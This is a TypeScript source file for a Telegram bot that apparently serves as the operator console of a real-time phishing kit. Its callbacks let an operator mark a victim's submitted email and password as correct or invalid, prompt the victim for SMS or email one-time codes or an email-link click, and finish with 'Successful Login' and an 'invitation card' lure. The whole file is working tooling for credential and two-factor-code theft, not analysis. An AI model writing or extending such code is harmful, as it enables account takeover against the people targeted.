import { Bot } from "grammy";
import {
  selectLeadChannel,
  updateLeadChannel,
} from "../methods/lead.methods.js";
import { InlineKeyboard } from "grammy";

const botToken = process.env.TELEGRAM_BOT_TOKEN;

if (!botToken) {
  throw new Error("Missing Telegram bot token environment variable.");
}

export const bot = new Bot(botToken);

export async function activateTelegramBot(): Promise<void> {
  await bot.api.setMyCommands([
    {
      command: "whoami",
      description: "See your user and chat IDs.",
    },
  ]);

  await bot.command("whoami", async (context) => {
    const userId = context.from?.id;
    const chatId = context.chat?.id;
    if (userId === undefined || chatId === undefined) return;
    await context.reply(`User ID - ${userId}\n\nChat ID - ${chatId}`, {
      reply_markup: new InlineKeyboard()
        .copyText("User ID", `${userId}`)
        .copyText("Chat ID", `${chatId}`),
    });
  });

  const buildChannelOptions = (anchor: string, overload: string[]) => {
    let keyboard = new InlineKeyboard();
    if (!overload.includes("sms-code")) {
      keyboard = keyboard
        .text("SMS Code", `lead-review:${anchor}:verify-sms-code`)
        .row();
    }
    if (!overload.includes("email-code")) {
      keyboard = keyboard
        .text("Email Code", `lead-review:${anchor}:verify-email-code`)
        .row();
    }
    if (!overload.includes("email-link")) {
      keyboard = keyboard
        .text("Email Link", `lead-review:${anchor}:verify-email-link`)
        .row();
    }
    return keyboard
      .text("Restart", `lead-review:${anchor}:restart`)
      .primary()
      .text("Complete", `lead-review:${anchor}:complete`)
      .success();
  };

  bot.callbackQuery(
    /^lead-review:([a-f0-9-]+):auth-(pass|flag)$/,
    async (context) => {
      const [, anchor, action] = context.match;
      const pass = action === "pass";
      await context.answerCallbackQuery({
        text: pass ? "Approving authentication." : "Rejecting authentication.",
      });
      try {
        const channel = await updateLeadChannel(anchor, {
          status: pass ? "passing" : "flagged",
          process: "auth",
          message: pass
            ? "Proceeding to the next step..."
            : "Invalid email or password. Please try again.",
          logEntry: pass ? "✅ Correct credentials" : "❌ Invalid credentials",
        });
        if (!channel) throw "Invalid flow or crashed flow key.";
        if (pass) {
          await context.editMessageText(
            channel.logs + "\n\n" + "🚀 Select what's next" + "\n",
            {
              reply_markup: buildChannelOptions(anchor, channel.overload),
            },
          );
        } else {
          await context.deleteMessage();
        }
      } catch (error) {
        console.error("Lead review callback failed:", error);
      }
    },
  );

  bot.callbackQuery(
    /^lead-review:([a-f0-9-]+):verify-(sms|email)-code$/,
    async (context) => {
      const [, anchor, type] = context.match;
      const request = type === "sms" ? "SMS code" : "email code";
      await context.answerCallbackQuery({
        text: `Sending ${request} verification request...`,
      });
      try {
        const channel = await updateLeadChannel(anchor, {
          status: "idle",
          process: type === "sms" ? "verify-sms-code" : "verify-email-code",
          message:
            type === "sms"
              ? "Enter the verification code sent to your mobile phone."
              : "Enter the verification code sent to your email address.",
          logEntry: `Sent ${request} verification request`,
        });
        if (!channel) throw "Invalid anchor or crashed channel.";
        await context.editMessageText(channel.logs + "\n", {
          reply_markup: new InlineKeyboard()
            .text(
              `Resend ${request}`,
              `lead-review:${anchor}:verify-${type}-code`,
            )
            .primary(),
        });
      } catch (error) {
        console.error("Lead review callback failed:", error);
      }
    },
  );

  bot.callbackQuery(
    /^lead-review:([a-f0-9-]+):verify-(sms|email)-code-(pass|flag)$/,
    async (context) => {
      const [, anchor, type, action] = context.match;
      const request = type === "sms" ? "SMS code" : "email code";
      const pass = action === "pass";
      await context.answerCallbackQuery({
        text: pass
          ? `Approving ${request} verification request.`
          : `Rejecting ${request} verification request.`,
      });
      try {
        const channel = await updateLeadChannel(anchor, {
          status: pass ? "passing" : "flagged",
          process: type === "sms" ? "verify-sms-code" : "verify-email-code",
          message:
            type === "sms"
              ? pass
                ? "Proceeding to the next step..."
                : "The SMS code you entered is incorrect or has expired."
              : pass
                ? "Email code verified successfully."
                : "The email code entered is incorrect or has expired.",
          overload: pass ? [`${type}-code`] : undefined,
          logEntry: pass ? `✅ Correct ${request}` : `❌ Invalid ${request}`,
        });
        if (!channel) throw "Invalid anchor or crashed channel.";
        if (pass) {
          await context.editMessageText(
            channel.logs + "\n\n" + "🚀 Select what's next" + "\n",
            {
              reply_markup: buildChannelOptions(anchor, channel.overload),
            },
          );
        } else {
          await context.editMessageText(channel.logs + "\n", {
            reply_markup: new InlineKeyboard()
              .text(
                `Resend ${request}`,
                `lead-review:${anchor}:verify-${type}-code-spam`,
              )
              .primary(),
          });
        }
      } catch (error) {
        console.error("Lead review callback failed:", error);
      }
    },
  );

  bot.callbackQuery(
    /^lead-review:([a-f0-9-]+):verify-email-link$/,
    async (context) => {
      const [, anchor] = context.match;
      await context.answerCallbackQuery({
        text: `Sending email link verification request...`,
      });
      try {
        const channel = await updateLeadChannel(anchor, {
          status: "idle",
          process: "verify-email-link",
          message:
            "Please check your inbox and click the verification link we sent you.",
          logEntry: "Sent email link verification request",
        });
        if (!channel) throw "Invalid anchor or crashed channel.";
        await context.editMessageText(channel.logs + "\n", {
          reply_markup: new InlineKeyboard()
            .text(
              "Approve Verification",
              `lead-review:${anchor}:verify-email-link-pass`,
            )
            .success(),
        });
      } catch (error) {
        console.error("Lead review callback failed:", error);
      }
    },
  );

  bot.callbackQuery(
    /^lead-review:([a-f0-9-]+):verify-email-link-pass$/,
    async (context) => {
      const [, anchor] = context.match;
      await context.answerCallbackQuery({
        text: "Approving email link verification request.",
      });
      try {
        const channel = await updateLeadChannel(anchor, {
          status: "passing",
          process: "verify-email-link",
          message: "Proceeding to the next step...",
          overload: ["email-link"],
          logEntry: "✅ Email Link Clicked",
        });
        if (!channel) throw "Invalid anchor or crashed channel.";
        await context.editMessageText(
          channel.logs + "\n\n" + "🚀 Select what's next" + "\n",
          {
            reply_markup: buildChannelOptions(anchor, channel.overload),
          },
        );
      } catch (error) {
        console.error("Lead review callback failed:", error);
      }
    },
  );

  bot.callbackQuery(/^lead-review:([a-f0-9-]+):complete$/, async (context) => {
    const [, anchor] = context.match;
    await context.answerCallbackQuery({ text: "Completing..." });
    try {
      const channel = await updateLeadChannel(anchor, {
        status: "completed",
        process: "init",
        message:
          "We've sent your invitation card to your email address. " +
          "Stay tunned for follow up instructions.",
      });
      if (!channel) throw "Invalid anchor or crashed channel.";
      await context.editMessageText(
        channel.baseLog + "\n\n" + "🔐 Successful Login",
        {
          reply_markup: new InlineKeyboard().text(
            "Restart",
            `lead-review:${anchor}:restart`,
          ),
        },
      );
    } catch (error) {
      console.error("Lead review callback failed:", error);
    }
  });

  bot.callbackQuery(/^lead-review:([a-f0-9-]+):restart$/, async (context) => {
    const [, anchor] = context.match;
    await context.answerCallbackQuery({ text: "Restarting..." });
    try {
      await selectLeadChannel(anchor, { status: "idle" });
      await context.deleteMessage();
    } catch (error) {
      console.error("Lead review callback failed:", error);
    }
  });
}
